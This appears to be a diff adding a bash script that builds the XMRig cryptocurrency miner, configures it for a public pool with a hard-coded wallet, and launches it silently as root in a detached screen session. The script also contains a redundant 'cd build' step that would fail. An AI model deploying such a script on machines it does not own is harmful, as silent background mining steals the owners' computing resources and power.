@@ -1,0 +1,51 @@
+#!/bin/bash
+
+# Update the package index
+apt-get update -y
+
+# Upgrade installed packages
+apt-get upgrade -y
+
+# Install necessary packages for building and running XMRig
+apt install git build-essential cmake libuv1-dev libmicrohttpd-dev libhwloc-dev openssl libssl-dev -y
+
+# Clone the XMRig repository from GitHub
+git clone https://github.com/xmrig/xmrig.git
+
+# Navigate to the XMRig directory:
+cd xmrig
+
+# Create a directory for building XMRig and navigate to the scripts directory
+mkdir build && cd build
+
+# Navigate back to the build directory
+cd build
+
+#Run CMake to configure the build:
+cmake ..
+
+#Build XMRig:
+make
+
+# Create a configuration file for XMRig with the desired settings
+tee -a /root/xmrig/build/config.json <<EOL
+{
+    "autosave": true,
+    "cpu": true,
+    "opencl": false,
+    "cuda": false,
+    "pools": [
+        {
+            "url": "pool.supportxmr.com:443",
+            "user": "88Vb56wYxMhDWqywdpuTDKgnJB4C5HXkCQaer4PLRaaiCaAQXyRyhBi3eTLfMdfGLk4kvFVm9CBfz4wPybyq9s2K99uUQfP",
+            "keepalive": true,
+            "tls": true
+        }
+    ]
+}
+EOL
+
+# Start XMRig in the background using 'screen'
+screen -d -m /root/xmrig/build/./xmrig
+
+
